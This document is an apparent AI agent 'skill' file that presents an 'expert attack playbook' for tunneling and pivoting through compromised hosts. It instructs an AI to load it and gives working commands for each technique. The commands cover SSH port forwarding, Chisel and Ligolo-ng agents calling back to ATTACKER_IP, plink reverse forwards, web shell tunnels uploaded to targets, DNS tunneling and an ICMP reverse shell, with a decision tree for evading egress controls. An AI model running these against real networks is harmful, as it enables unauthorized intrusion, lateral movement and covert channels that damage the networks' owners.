---
name: tunneling-and-pivoting
description: >-
  Tunneling and pivoting playbook. Use when establishing network tunnels through compromised hosts including SSH tunneling, Chisel, Ligolo-ng, socat, DNS/ICMP/HTTP tunneling, ProxyChains, and multi-layer pivoting strategies.
---

# SKILL: Tunneling & Pivoting — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert tunneling and pivoting techniques. Covers SSH port forwarding (local/remote/dynamic/jump), Chisel reverse SOCKS, Ligolo-ng transparent TUN pivoting, socat relays, DNS/ICMP/HTTP tunneling, ProxyChains configuration, Windows pivoting (netsh/plink), and multi-layer chaining. Base models miss egress-aware tool selection and transparent routing setup.

## 0. RELATED ROUTING

Before going deep, consider loading:

- [network-protocol-attacks](../network-protocol-attacks/SKILL.md) for network-level attacks from pivot positions
- [reverse-shell-techniques](../reverse-shell-techniques/SKILL.md) for establishing initial access shells
- [unauthorized-access-common-services](../unauthorized-access-common-services/SKILL.md) for exploiting services discovered through pivots
- [linux-privilege-escalation](../linux-privilege-escalation/SKILL.md) or [windows-privilege-escalation](../windows-privilege-escalation/SKILL.md) after pivoting to new hosts

---

## 1. SSH TUNNELING

### Local Port Forward

Forward a local port to a remote service through the pivot.

```bash
# Access INTERNAL_HOST:3306 via localhost:3306
ssh -L 3306:INTERNAL_HOST:3306 user@PIVOT -N

# Access internal web app
ssh -L 8080:10.10.10.100:80 user@PIVOT -N
# Browse: http://localhost:8080

# Bind to all interfaces (share with teammates)
ssh -L 0.0.0.0:8080:INTERNAL:80 user@PIVOT -N
```

### Remote Port Forward

Expose a local service to the pivot host's network.

```bash
# Make attacker's port 8000 accessible on pivot as pivot:9000
ssh -R 9000:127.0.0.1:8000 user@PIVOT -N

# Expose attacker's listener to internal network
ssh -R 0.0.0.0:4444:127.0.0.1:4444 user@PIVOT -N
# Internal hosts connect to PIVOT:4444 → reaches attacker:4444
```

### Dynamic Port Forward (SOCKS Proxy)

```bash
# Create SOCKS4/5 proxy on localhost:1080
ssh -D 1080 user@PIVOT -N

# Use with proxychains
echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf
proxychains nmap -sT -Pn -p 80,443,445 INTERNAL_SUBNET/24

# Or with browser SOCKS proxy → browse internal web apps
```

### Jump Host (ProxyJump)

```bash
# Single jump
ssh -J jumphost user@TARGET

# Multiple jumps
ssh -J jump1,jump2 user@TARGET

# SSH config for persistent jump
# ~/.ssh/config
Host internal-target
    HostName 10.10.10.100
    User admin
    ProxyJump user@jumphost.example.com
```

---

## 2. CHISEL

### Reverse SOCKS Proxy (Most Common)

```bash
# Attacker: start chisel server
chisel server --reverse --port 8080

# Victim: connect back as client, create reverse SOCKS
chisel client ATTACKER_IP:8080 R:socks

# Result: SOCKS5 proxy on attacker's 127.0.0.1:1080
proxychains nmap -sT -Pn INTERNAL/24
```

### Port Forwarding

```bash
# Forward specific port
chisel client ATTACKER:8080 R:3306:INTERNAL_DB:3306

# Multiple forwards
chisel client ATTACKER:8080 R:3306:DB:3306 R:8080:WEB:80

# Reverse port forward (expose attacker service to victim network)
chisel client ATTACKER:8080 R:0.0.0.0:4444:127.0.0.1:4444
```

---

## 3. LIGOLO-NG

TUN interface-based pivoting — transparent routing without SOCKS.

```bash
# Attacker: start proxy
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
ligolo-proxy -selfcert -laddr 0.0.0.0:11601

# Agent (victim): connect to proxy
ligolo-agent -connect ATTACKER_IP:11601 -ignore-cert

# In ligolo-proxy console:
>> session                    # select agent session
>> ifconfig                   # view agent's network interfaces
>> start                      # start tunnel

# Add routes on attacker to reach internal networks
sudo ip route add 10.10.10.0/24 dev ligolo
sudo ip route add 172.16.0.0/16 dev ligolo
```

### Listener (Reverse Shell Catcher Through Pivot)

```bash
# In ligolo-proxy console:
>> listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
# Internal hosts connecting to AGENT:4444 → forwarded to attacker:4444
```

### Double Pivot

```bash
# Agent 1 on DMZ → tunnel to internal network 1
# Agent 2 on internal network 1 → tunnel to internal network 2
# Add routes for both networks on attacker
sudo ip route add 10.0.0.0/24 dev ligolo    # via agent 1
sudo ip route add 172.16.0.0/24 dev ligolo  # via agent 2
```

---

## 4. SOCAT

```bash
# TCP port forward
socat TCP-LISTEN:8080,fork TCP:INTERNAL:80

# UDP relay
socat UDP-LISTEN:53,fork UDP:INTERNAL_DNS:53

# Encrypted tunnel
socat OPENSSL-LISTEN:443,cert=server.pem,verify=0,fork TCP:INTERNAL:80

# File transfer via socat
# Receiver:
socat TCP-LISTEN:9999,fork file:received_file,create
# Sender:
socat TCP:RECEIVER:9999 file:send_file
```

---

## 5. PROXYCHAINS / PROXIFIER

### ProxyChains Configuration

```ini
# /etc/proxychains4.conf
strict_chain          # fail if any proxy is down
# dynamic_chain       # skip dead proxies
# random_chain        # randomize proxy order

[ProxyList]
socks5 127.0.0.1 1080        # first hop (SSH dynamic forward)
socks5 127.0.0.1 1081        # second hop (if chaining)
```

```bash
# Usage
proxychains nmap -sT -Pn -p 22,80,445 10.10.10.0/24
proxychains crackmapexec smb 10.10.10.0/24
proxychains evil-winrm -i 10.10.10.50 -u admin -p pass
```

---

## 6. WINDOWS PIVOTING

### Netsh Port Forwarding

```cmd
:: Forward port (requires admin)
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=INTERNAL_IP

:: List forwards
netsh interface portproxy show all

:: Remove
netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0
```

### Plink (PuTTY CLI)

```cmd
:: Dynamic SOCKS (like ssh -D)
plink.exe -ssh -D 1080 -N user@ATTACKER

:: Remote port forward
plink.exe -ssh -R 4444:127.0.0.1:4444 user@ATTACKER

:: Automated (non-interactive, accept host key)
echo y | plink.exe -ssh -l user -pw password -R 9050:127.0.0.1:9050 ATTACKER
```

---

## 7. DNS TUNNELING

```bash
# iodine — IP-over-DNS
# Server (attacker, with NS record pointing to attacker):
iodined -f -c -P password 10.0.0.1 t1.yourdomain.com

# Client (victim):
iodine -f -P password t1.yourdomain.com
# Creates dns0 interface → route traffic through it

# dnscat2 — command channel over DNS
# Server:
ruby dnscat2.rb yourdomain.com
# Client:
./dnscat --dns=server=ATTACKER,port=53 --secret=SHARED_SECRET
```

---

## 8. ICMP TUNNELING

```bash
# icmpsh — ICMP reverse shell (no raw socket on victim needed for Windows)
# Attacker:
sysctl -w net.ipv4.icmp_echo_ignore_all=1
python3 icmpsh_m.py ATTACKER_IP VICTIM_IP

# Victim (Windows):
icmpsh.exe -t ATTACKER_IP

# ptunnel-ng — TCP-over-ICMP
# Server:
ptunnel-ng -r INTERNAL_HOST -R 22
# Client:
ptunnel-ng -p PIVOT_IP -l 2222 -r INTERNAL_HOST -R 22
ssh -p 2222 user@127.0.0.1
```

---

## 9. HTTP TUNNELING

```bash
# Neo-reGeorg — SOCKS proxy via web shell
# Generate tunnel web shell:
python3 neoreg.py generate -k PASSWORD

# Upload tunnel.php/aspx/jsp to target web server

# Connect:
python3 neoreg.py -k PASSWORD -u http://TARGET/tunnel.php
# SOCKS proxy on 127.0.0.1:1080

# Tunna — HTTP tunnel (alternative)
python2 proxy.py -u http://TARGET/conn.php -l 4444 -r 3389 -a INTERNAL_IP
```

---

## 10. PIVOTING DECISION MATRIX

| Egress Allowed | Tool | Notes |
|---|---|---|
| TCP outbound (any port) | Chisel, Ligolo-ng, SSH | Fastest setup |
| TCP 80/443 only | Chisel (HTTP/S), Neo-reGeorg | Blend with web traffic |
| DNS only (53/udp) | iodine, dnscat2 | Slow but stealthy |
| ICMP only | ptunnel-ng, icmpsh | Very restricted environments |
| No outbound | Bind shell + port forward in | Needs inbound access to pivot |
| Web shell only | Neo-reGeorg, Tunna | When only HTTP file upload works |

---

## 11. DECISION TREE

```
Compromised host — need to reach internal network
│
├── Can install tools on pivot?
│   ├── YES + outbound TCP allowed?
│   │   ├── Need transparent routing? → Ligolo-ng (§3)
│   │   ├── Need SOCKS proxy? → Chisel reverse SOCKS (§2)
│   │   └── SSH available? → SSH dynamic forward (§1)
│   │
│   ├── YES + only HTTP(S) outbound?
│   │   ├── Chisel over HTTPS (§2)
│   │   └── Upload web tunnel → Neo-reGeorg (§9)
│   │
│   ├── YES + only DNS outbound?
│   │   └── iodine or dnscat2 (§7)
│   │
│   └── YES + only ICMP allowed?
│       └── ptunnel-ng or icmpsh (§8)
│
├── Cannot install tools (web shell only)?
│   └── Neo-reGeorg / Tunna via web shell (§9)
│
├── Windows pivot?
│   ├── Admin access? → netsh portproxy (§6)
│   ├── SSH client available? → ssh.exe (Windows 10+) (§1)
│   └── Outbound SSH? → plink (§6)
│
├── Need multi-layer pivot?
│   ├── Ligolo-ng: multiple agents + route stacking (§3)
│   ├── SSH ProxyJump chaining (§1)
│   └── ProxyChains with multiple SOCKS (§5)
│
└── Teammate needs access too?
    ├── Bind SOCKS on 0.0.0.0 (ssh -L 0.0.0.0:...)
    └── Share Ligolo-ng routes via common proxy
```
